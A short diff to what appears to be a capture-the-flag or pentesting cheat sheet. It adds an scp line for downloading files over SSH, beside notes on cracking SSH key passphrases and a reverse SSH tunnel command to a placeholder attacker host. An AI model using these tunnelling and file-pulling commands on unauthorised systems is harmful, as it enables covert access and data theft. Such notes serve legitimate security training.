@@ -33,7 +33,7 @@ https://github.com/Ganapati/RsaCtfTool
 ### SSH
 https://medium.com/bugbountywriteup/cracking-ssh-private-key-passphrase-459ba17e8d5d
 
-
+- scp name@ip:/home/dir/file.name $(pwd)   - dowloading file from ssh
 ### SSH tunelling
  - netstat -tulpn - what services are running
  - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
